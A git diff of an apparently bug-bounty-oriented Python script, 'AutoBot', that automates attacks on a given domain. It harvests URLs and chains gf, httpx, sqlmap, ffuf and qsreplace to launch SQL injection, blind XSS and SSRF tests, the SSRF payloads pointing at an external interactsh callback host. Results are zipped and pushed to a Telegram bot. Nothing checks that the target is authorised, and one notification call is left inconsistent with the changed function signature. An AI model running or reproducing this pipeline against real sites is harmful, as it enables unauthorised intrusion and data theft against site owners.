@@ -1,7 +1,6 @@
 #!/usr/bin/python3  
 
-from libs.telegramText import NotifyBot 
-from libs.telegramText import SendDocumentBot 
+from libs.telegramText import NotifyBot, SendDocumentBot, CheckTokens, GetTokens   
 import libs.coloredOP as co
 from pathlib import Path
 from zipfile import ZipFile
@@ -13,6 +12,12 @@ import requests
 import subprocess 
 import argparse 
 import sys
+
+### GLOBAL VARS 
+CONFIGPath = "/root/notificationConfig.ini"
+TELEGRAMTokens = False
+TELEGRAM_KEYS = {}
+###
 
 def executeCommand(COMMAND, verbose=False):
     try:
@@ -53,10 +58,15 @@ def CollectURLS(Domain):
     os.remove("temp_urls.txt")
     # count number of lines 
     numOfLines = open("urls.txt", "r").read().count("\n")-1
-    NotifyBot("🥷 AutoBot : {} URLs collected for {}".format(numOfLines, Domain))
+    global TELEGRAMTokens
+    if TELEGRAMTokens:
+        NotifyBot("🥷 AutoBot : {} URLs collected for {}".format(numOfLines, Domain))
 
 def XSSAttack(Domain, BlindXSS=None):
-    NotifyBot("🥷 AutoBot : XSS Scan Started on target {}".format(Domain))
+    global TELEGRAMTokens
+    global TELEGRAM_KEYS
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Started on target {}".format(Domain))
     COMMAND = 'cat urls.txt | gf xss | httpx -mc 200,201,202,300,301,302 -silent >> xss_urls.txt'
     executeCommand(COMMAND)
     if BlindXSS:
@@ -85,17 +95,23 @@ def XSSAttack(Domain, BlindXSS=None):
             os.remove("xss_kxss.txt")
     # cleaning extra files
     os.remove("xss_urls.txt")
-    NotifyBot("🥷 AutoBot : XSS Scan Finished on target {} ✅".format(Domain))
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Finished on target {} ✅".format(Domain))
     if os.path.isfile(FName):
         if os.path.getsize(FName) < 52428800:
-            NotifyBot("🥷 AutoBot : Download XSS Scan Result : {}".format(FName))
-            SendDocumentBot(FName)
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download XSS Scan Result : {}".format(FName))
+                SendDocumentBot(TELEGRAM_KEYS, FName)
         else:
-            NotifyBot("🥷 AutoBot : XSS Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
 
 
 def SQLInjection(Domain):
-    NotifyBot("🥷 AutoBot : SQLi Scan Started on target {}".format(Domain))
+    global TELEGRAMTokens
+    global TELEGRAM_KEYS
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Started on target {}".format(Domain))
     executeCommand('cat urls.txt | gf sqli | httpx -mc 200,201,202,300,301,302 -silent >> sqli_urls.txt')
     # perform sql injection attack on target 
     executeCommand('sqlmap -m sqli_urls.txt --batch --random-agent --level 1 | tee sqli_result.txt')
@@ -105,56 +121,75 @@ def SQLInjection(Domain):
         CompressFile(FName, ['sqli_result.txt'])
         os.remove("sqli_result.txt")
         os.remove("sqli_urls.txt")
-    NotifyBot("🥷 AutoBot : SQLi Scan Finished on target {} ✅".format(Domain))
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Finished on target {} ✅".format(Domain))
     if os.path.isfile(FName):
         if os.path.getsize(FName) < 52428800:
-            NotifyBot("🥷 AutoBot : Download SQLi Scan Result : {}".format(FName))
-            SendDocumentBot(FName)
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download SQLi Scan Result : {}".format(FName))
+                SendDocumentBot(TELEGRAM_KEYS, FName)
         else:
-            NotifyBot("🥷 AutoBot : SQLi Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
 
 def SSRFScan(Domain, InteractSH):
-    NotifyBot("🥷 AutoBot : SSRF Scan Started on target {}".format(Domain))
+    global TELEGRAMTokens
+    global TELEGRAM_KEYS
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SSRF Scan Started on target {}".format(Domain))
     executeCommand('cat urls.txt | gf ssrf | httpx -mc 200,201,202,300,301,302 -silent >> ssrf_urls.txt')
     COMMAND = 'cat ssrf_urls.txt | qsreplace "{}" >> ssrf_paylod_urls.txt'.format(InteractSH)
     executeCommand(COMMAND)
     executeCommand('ffuf -c -w ssrf_paylod_urls.txt -u FUZZ -o ssrf_fuzz_result.txt')
     # cleaning extra files
     os.remove("ssrf_urls.txt")
-    NotifyBot("🥷 AutoBot : SSRF Scan Finished on target {} ✅".format(Domain))
-    NotifyBot("🥷 AutoBot : Check Your intactsh instance for any Hit!! {}")
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SSRF Scan Finished on target {} ✅".format(Domain))
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Check Your intactsh instance for any Hit!!")
 
 def OpenRedirect(Domain):
-    NotifyBot("🥷 AutoBot : Open-Redirect Started on target {}".format(Domain))
+    global TELEGRAMTokens
+    global TELEGRAM_KEYS
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Open-Redirect Started on target {}".format(Domain))
     executeCommand('cat urls.txt | gf redirect | httpx -mc 200,201,202,300,301,302 -silent >> openredirect_urls.txt')
     # compress files 
     FName = "{}_openRedirect.zip".format(Domain)
     if os.path.isfile("openredirect_urls.txt"):
         CompressFile(FName, ['openredirect_urls.txt'])
         os.remove("openredirect_urls.txt")
-    NotifyBot("🥷 AutoBot : Open-Redirect Scan Finished on target {} ✅".format(Domain))
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Open-Redirect Scan Finished on target {} ✅".format(Domain))
     if os.path.isfile(FName):
         if os.path.getsize(FName) < 52428800:
-            NotifyBot("🥷 AutoBot : Download OpenRedirect Scan Result {} for manual analysis.".format(FName))
-            SendDocumentBot(FName)
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download OpenRedirect Scan Result {} for manual analysis.".format(FName))
+                SendDocumentBot(TELEGRAM_KEYS, FName)
         else:
-            NotifyBot("🥷 AutoBot : OpenRedirect Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
+            if TELEGRAMTokens: 
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : OpenRedirect Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
     
 def IDORScan(Domain):
-    NotifyBot("🥷 AutoBot : IDORScan Started on target {}".format(Domain))
+    global TELEGRAMTokens
+    global TELEGRAM_KEYS
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDORScan Started on target {}".format(Domain))
     executeCommand('cat urls.txt | gf idor | httpx -mc 200,201,202,300,301,302 -silent >> idor_urls.txt')
     # compress files 
     FName = "{}_idor.zip".format(Domain)
     if os.path.isfile("idor_urls.txt"):
         CompressFile(FName, ['idor_urls.txt'])
         os.remove("idor_urls.txt")
-    NotifyBot("🥷 AutoBot : IDOR Scan Finished on target {} ✅".format(Domain))
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDOR Scan Finished on target {} ✅".format(Domain))
     if os.path.isfile(FName):
         if os.path.getsize(FName) < 52428800:
-            NotifyBot("🥷 AutoBot : Download IDOR Scan Result {} for manual analysis.".format(FName))
-            SendDocumentBot(FName)
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download IDOR Scan Result {} for manual analysis.".format(FName))
+                SendDocumentBot(TELEGRAM_KEYS, FName)
         else:
-            NotifyBot("🥷 AutoBot : IDOR Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
+            if TELEGRAMTokens:
+                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDOR Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
 
 def Banner():
     print(co.colors.BLUE+"################################################################################"+co.END)
@@ -178,13 +213,13 @@ def printInfo(Domain, OPDir):
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-u", "--url", help="Domain name to perform Attack", type=str)
+    parser.add_argument("-d", "--domain", help="Domain name to perform Attack", type=str)
     parser.add_argument("-o", "--out", help="Output directory name", type=str)
     parser.add_argument("-b", "--blind", help="XSS hunter URL for Blind XSS inection Testing", type=str, default=None)
     parser.add_argument("-i", "--interactSH", help="InteractSH URL for Catching SSRF", type=str)
     args = parser.parse_args()
     # Check argument
-    if args.url is None and args.interactSH is None:
+    if args.domain is None and args.interactSH is None:
         Banner()
         parser.print_help()
         sys.exit()
@@ -210,9 +245,24 @@ def main():
             Domain = re.sub(":80/$", "", Domain)
         except:
             print(co.bullets.ERROR, co.colors.BRED+" Error : Could not resolve the Http protocol.!!"+co.END)
-            sys.exit(1)
+            sys.exit(1) 
+    # check talegram keys 
+    global CONFIGPath
+    global TELEGRAMTokens
+    global TELEGRAM_KEYS
+    retVal = CheckTokens(CONFIGPath)
+    if retVal == 1:
+        TELEGRAMTokens = True
+        apiToken, chatID = GetTokens(CONFIGPath)
+        TELEGRAM_KEYS['apiToken'] = apiToken
+        TELEGRAM_KEYS['chatID'] = chatID
+    elif retVal == 2:
+        print(co.bullets.ERROR+co.colors.RED+"Telegram Bot keys not found.!1"+co.END)
+    elif retVal == 3:
+        print(co.bullets.ERROR+co.colors.RED+"Telegram Bot Config File not found.!1"+co.END)
     # Sending telegram message
-    NotifyBot("🥷 AutoBot : Automated attcker staretd for domain : {}".format(tDomain))
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Automated attcker staretd for domain : {}".format(tDomain))
     # Create output dir 
     if args.out is not None:
         OPDir = args.out
